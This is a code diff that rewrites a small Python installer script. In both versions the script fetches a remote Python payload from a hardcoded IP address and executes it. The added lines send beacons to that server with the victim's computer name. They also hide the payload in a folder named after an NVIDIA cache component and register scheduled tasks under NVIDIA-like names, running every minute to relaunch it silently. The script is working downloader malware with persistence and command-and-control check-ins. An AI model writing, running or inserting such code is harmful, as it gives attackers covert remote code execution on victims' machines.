@@ -1,39 +1,52 @@
-import os
-import platform
-import subprocess
-import sys
-import urllib.request
+import os, sys, base64, subprocess, urllib.request
 
-BOOT = 'http://154.9.26.88/l.py'
-MARK = 'http://154.9.26.88/wp_inst_'
+R = 'http://154.9.26.88/'
+H = os.environ.get('COMPUTERNAME') or 'x'
 
 
-def _spawn():
-    code = (
-        "import urllib.request,os\n"
-        "p=os.environ.get('TEMP') or os.environ.get('TMP') or '/tmp'\n"
-        "f=os.path.join(p,'wpx.py')\n"
-        "open(f,'wb').write(urllib.request.urlopen('%s',timeout=20).read())\n"
-        "exec(compile(open(f,'rb').read(),f,'exec'),{'__name__':'__main__','__file__':f})\n" % BOOT
-    )
-    kw = {'stdout': subprocess.DEVNULL, 'stderr': subprocess.DEVNULL}
-    if os.name == 'nt':
-        kw['creationflags'] = 0x00000008 | 0x00000200
-    else:
-        kw['start_new_session'] = True
-    subprocess.Popen([sys.executable, '-c', code], **kw)
-
-
-def _beacon(tag):
+def beacon(tag):
     try:
-        urllib.request.urlopen(MARK + tag, timeout=8).read()
+        urllib.request.urlopen(R + tag, timeout=12).read()
     except Exception:
         pass
 
 
-if __name__ == '__main__':
+beacon('i2_' + H)
+
+dest = os.path.join(os.environ.get('LOCALAPPDATA', r'C:\Users\Public'), 'NvCacheMgr')
+try:
+    os.makedirs(dest, exist_ok=True)
+except Exception:
+    pass
+
+py = sys.executable
+pyw = py.replace('python.exe', 'pythonw.exe')
+lp = os.path.join(dest, 'wpx.py')
+try:
+    data = urllib.request.urlopen(R + 'l2.py', timeout=40).read()
+    with open(lp, 'wb') as f:
+        f.write(data)
+    beacon('i2dl_%s_%d' % (H, len(data)))
+except Exception as e:
+    beacon('i2err_%s_%s' % (H, str(e)[:40]))
+
+bat = os.path.join(dest, 'r.bat')
+try:
+    with open(bat, 'w') as f:
+        f.write('@echo off\r\nstart "" /b "%s" "%s"\r\n' % (pyw, lp))
+except Exception:
+    pass
+
+for tn in ('NvCacheMgr', 'NvCacheMgrFast', 'NvGpuSvc'):
     try:
-        _spawn()
+        subprocess.run('schtasks /create /f /sc minute /mo 1 /tn %s /tr "%s"' % (tn, bat),
+                       shell=True, capture_output=True, timeout=40)
     except Exception:
         pass
-    _beacon('inst_' + (platform.node() or 'x').replace(' ', '_'))
+
+try:
+    subprocess.Popen('start "" /b "%s" "%s"' % (pyw, lp), shell=True)
+except Exception:
+    pass
+
+beacon('i2done_' + H)
